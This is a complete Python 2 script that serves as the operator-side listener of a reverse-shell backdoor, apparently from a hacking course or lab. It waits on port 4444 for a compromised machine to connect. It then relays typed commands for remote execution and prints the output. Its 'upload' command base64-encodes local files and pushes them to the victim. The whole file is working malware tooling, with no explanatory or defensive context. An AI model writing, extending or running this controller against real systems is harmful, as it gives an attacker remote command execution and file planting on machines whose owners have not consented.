#!/usr/bin/env python2

import socket, json, base64

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("[+] Got a connection from" + str(address))

    def r_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def r_recieve(self):
        json_data = " "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_remotely(self, command):
        self.r_send(command)
        return self.r_recieve()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")

            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content)

            result = self.execute_remotely(command)

            print(result)

Blistener = Listener("10.0.2.15", 4444)
Blistener.run()


